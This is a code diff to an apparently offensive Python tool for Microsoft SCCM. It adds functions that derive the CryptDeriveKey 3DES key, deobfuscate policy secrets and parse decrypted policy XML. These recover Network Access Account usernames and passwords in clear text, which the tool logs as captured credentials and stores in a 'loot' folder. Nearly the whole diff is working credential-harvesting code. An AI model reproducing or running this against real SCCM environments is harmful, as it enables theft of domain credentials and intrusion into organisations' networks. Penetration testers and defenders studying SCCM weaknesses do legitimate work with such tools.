@@ -12,12 +12,17 @@ from cryptography.hazmat.primitives.serialization import PublicFormat
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes, ciphers
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography import x509
 from cryptography.x509.oid import NameOID
 from cryptography.hazmat.primitives import hashes
 from cryptography.x509 import ObjectIdentifier
 from requests_toolbelt.multipart import decoder
 from requests_ntlm import HttpNtlmAuth
+import xml.etree.ElementTree as ET
 
 
 # Who needs just 1 date format :/
@@ -255,6 +260,66 @@ class SCCMTools():
           os.remove("certificate.pem")
           os.remove("key.pem")
 
+    def mscrypt_derive_key_sha1(self, secret:bytes):
+        # Implementation of CryptDeriveKey(prov, CALG_3DES, hash, 0, &cryptKey);
+        buf1 = bytearray([0x36] * 64)
+        buf2 = bytearray([0x5C] * 64)
+
+        digest = hashes.Hash(hashes.SHA1(), backend=default_backend())
+        digest.update(secret)
+        hash_ = digest.finalize()
+
+        for i in range(len(hash_)):
+            buf1[i] ^= hash_[i]
+            buf2[i] ^= hash_[i]
+
+        digest1 = hashes.Hash(hashes.SHA1(), backend=default_backend())
+        digest1.update(buf1)
+        hash1 = digest1.finalize()
+
+        digest2 = hashes.Hash(hashes.SHA1(), backend=default_backend())
+        digest2.update(buf2)
+        hash2 = digest2.finalize()
+
+        derived_key = hash1 + hash2[:4]
+        return derived_key
+
+    def deobfuscate_policysecret(self, output:str or bytes):
+        if isinstance(output, str):
+            output = bytes.fromhex(output)
+
+        data_length = int.from_bytes(output[52:56], 'little')
+        buffer = output[64:64+data_length]
+
+        key = self.mscrypt_derive_key_sha1(output[4:4+0x28])
+        iv = bytes([0] * 8)
+        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted_data = decryptor.update(buffer) + decryptor.finalize()
+
+        padder = padding.PKCS7(64).unpadder() # 64 is the block size in bits for DES3
+        decrypted_data = padder.update(decrypted_data) + padder.finalize()
+        return decrypted_data
+    
+
+    def parse_xml(self, xml_file):
+        try:
+            if xml_file.endswith("Ȃ"):
+                xml_file = xml_file[:-len("Ȃ")]
+                i = ET.fromstring(xml_file)
+                for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
+                    network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
+                    network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
+                    clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
+                    clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
+                    logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
+
+        except ET.ParseError as e:
+            print(f"An error occurred while parsing the XML: {e}")
+        except Exception as e:
+            print(e)
+    
+    
     def sccmwtf_run(self):
 
         logger.debug("[*] Creating certificate for our fake server...")
@@ -275,16 +340,22 @@ class SCCMTools():
 
         logger.debug("[*] Parsing for Secretz...")
 
+        policies = []
         for url in urls:
+
             result = self.requestPolicy(url)
             if result.startswith("<HTML>"):
                 try:
                     result = self.requestPolicy(url, uuid, True, True)
                     decryptedResult = self.parseEncryptedPolicy(result)
-                    Tools.write_to_file(decryptedResult, f"{self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
+                    self.parse_xml(decryptedResult)
+                    file_name = f"{self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml"
+                    Tools.write_to_file(decryptedResult, file_name)
+                    policies.append(file_name)
                     logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
                 except:
                    logger.info(f"[-] Something went wrong.")
+        #self.parse_xml(policies)
         self.cleanupCertifcate(True)
 
 
